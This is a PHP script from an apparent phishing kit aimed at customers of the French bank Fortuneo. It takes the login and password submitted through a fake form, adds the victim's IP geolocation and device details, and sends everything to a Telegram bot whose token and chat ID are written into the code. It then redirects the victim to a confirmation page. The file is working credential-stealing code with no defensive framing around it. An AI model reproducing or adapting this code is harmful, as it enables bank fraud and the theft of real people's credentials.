<?php
// fortuneo.php - Traitement pour Fortuneo

// 1. Récupération des données
$login = $_POST['login'] ?? '';
$motdepasse = $_POST['motdepasse'] ?? '';
$bank = $_POST['bank'] ?? 'Fortuneo';

// 2. Configuration Telegram
$telegramToken = "7749490498:AAHVQ5yVLBT1vFuulMXDe6GqA7K9pVk5YWs";
$telegramChatId = "7796457959";

// 3. Géolocalisation avec ipinfo.io
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$geoInfo = @json_decode(file_get_contents("https://ipinfo.io/{$ip}/json?token=3416ceaf95a319"), true);

// 4. Détection appareil
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$deviceType = preg_match('/Mobile|Android|iPhone/i', $userAgent) ? 'Mobile' : 'Desktop';

// 5. Date/Heure
date_default_timezone_set($geoInfo['timezone'] ?? 'Europe/Paris');
$currentTime = date('H:i:s');
$currentDate = date('d/m/Y');

// 6. Construction du message
$message = "
🏦 NOUVELLE CONNEXION {$bank}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ DATE ET HEURE:
📅 Date: {$currentDate}
🕒 Heure: {$currentTime}

🔐 DONNÉES DE CONNEXION:
👤 Identifiant: {$login}
🔑 Mot de passe: {$motdepasse}

📍 GÉOLOCALISATION:
🌍 IP: {$ip}
🏙️ Ville: " . ($geoInfo['city'] ?? 'Inconnue') . "
📌 Pays: " . ($geoInfo['country'] ?? 'Inconnu') . "

💻 INFOS APPAREIL:
📱 Type: {$deviceType}
🖥️ User-Agent: {$userAgent}
🖥️ Résolution: " . ($_POST['screen_width'] ?? 'Inconnue') . "x" . ($_POST['screen_height'] ?? 'Inconnue') . "
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";

// 7. Envoi à Telegram
$url = "https://api.telegram.org/bot{$telegramToken}/sendMessage?" . http_build_query([
    'chat_id' => $telegramChatId,
    'text' => $message
]);
@file_get_contents($url);

// 8. Redirection vers une page de confirmation
header("Location: ../final.php");
exit;
?>